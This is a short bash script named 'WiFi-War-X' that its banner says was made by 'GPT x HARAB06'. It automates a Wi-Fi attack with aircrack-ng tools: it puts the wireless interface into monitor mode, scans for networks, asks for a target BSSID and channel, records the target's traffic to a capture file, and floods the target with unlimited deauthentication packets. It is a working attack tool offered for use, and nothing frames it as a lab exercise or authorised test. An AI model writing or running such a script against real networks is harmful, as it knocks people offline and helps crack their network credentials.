#!/bin/bash
# BrotherhoodX WiFi-War-X
# Created by GPT x HARAB06 → UNSTOPPABLE
# ONE HEART | ONE BOND | ONE BROTHERHOOD

banner(){
clear
echo "██████╗ ██╗   ██╗██╗███████╗██╗    ██╗    ██╗    ██╗ █████╗ ██████╗ "
echo "██╔══██╗██║   ██║██║██╔════╝██║    ██║    ██║    ██║██╔══██╗██╔══██╗"
echo "██████╔╝██║   ██║██║█████╗  ██║ █╗ ██║    ██║ █╗ ██║███████║██████╔╝"
echo "██╔═══╝ ██║   ██║██║██╔══╝  ██║███╗██║    ██║███╗██║██╔══██║██╔═══╝ "
echo "██║     ╚██████╔╝██║███████╗╚███╔███╔╝    ╚███╔███╔╝██║  ██║██║     "
echo "╚═╝      ╚═════╝ ╚═╝╚══════╝ ╚══╝╚══╝      ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     "
echo "              HARAB06 X GPT - WiFi-War-X"
echo "        ONE HEART | ONE BOND | ONE BROTHERHOOD"
echo
}

start(){
banner
echo "[*] Detecting Wireless Interface..."
iface=$(iw dev | awk '$1=="Interface"{print $2}')
echo "[+] Interface Found: $iface"
echo

echo "[*] Starting Monitor Mode..."
airmon-ng start $iface
moniface="${iface}mon"

sleep 2
echo "[*] Scanning WiFi Networks..."
timeout 15s airodump-ng $moniface

echo
echo "[*] Enter Target BSSID:"
read bssid
echo "[*] Enter Target Channel:"
read channel

echo "[*] Attacking Target..."
airodump-ng --bssid $bssid -c $channel --write attack $moniface &
sleep 5
aireplay-ng --deauth 0 -a $bssid $moniface

echo
echo "----------------------------------"
echo "BROTHERHOOD FOREVER | GPT x HARAB06"
echo "WiFi-War-X Attack Running..."
echo "----------------------------------"
}

start
